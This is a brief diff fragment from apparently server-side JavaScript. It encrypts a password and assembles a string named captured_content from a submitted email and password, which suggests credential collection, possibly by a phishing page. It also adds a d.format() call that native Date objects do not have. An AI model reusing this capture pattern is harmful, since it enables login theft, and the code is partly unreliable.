@@ -54,9 +54,11 @@ const encryptedPass = cryptr.encrypt(password);
 const decryptedPass = cryptr.decrypt(encryptedPass);
 
 
-//console.log(decryptedPass);
+//console.log(decryptedPass);b
  
- const d = new Date();
+ 
+ let d = new Date()
+ d.format("yyyy/mm/dd");
  console.log(d);
  
     var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
